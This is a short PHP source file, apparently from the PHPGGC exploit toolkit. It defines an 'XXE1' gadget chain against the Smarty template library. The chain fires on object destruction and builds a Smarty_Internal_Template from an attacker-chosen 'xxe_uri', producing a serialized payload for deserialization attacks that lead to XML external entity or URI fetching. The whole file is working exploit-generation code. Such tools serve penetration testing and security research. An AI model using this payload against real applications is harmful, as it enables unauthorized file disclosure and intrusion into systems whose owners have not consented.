<?php
namespace GadgetChain\Smarty;
class XXE1 extends \PHPGGC\GadgetChain\URI
{
    public static $version = '?';
    public static $vector = '__destruct';
    public static $foundby = 'unknown';
    public static $author = 'mr_me';
    public static $reference = 'https://www.ptsecurity.com/upload/corporate/ww-en/analytics/Positive-Research-2014-eng.pdf';
    public static $parameters = [
        'xxe_uri'
    ];

    public function generate(array $parameters)
    {
        return new \Smarty_Internal_Template($parameters['xxe_uri']);
    }
}
?>
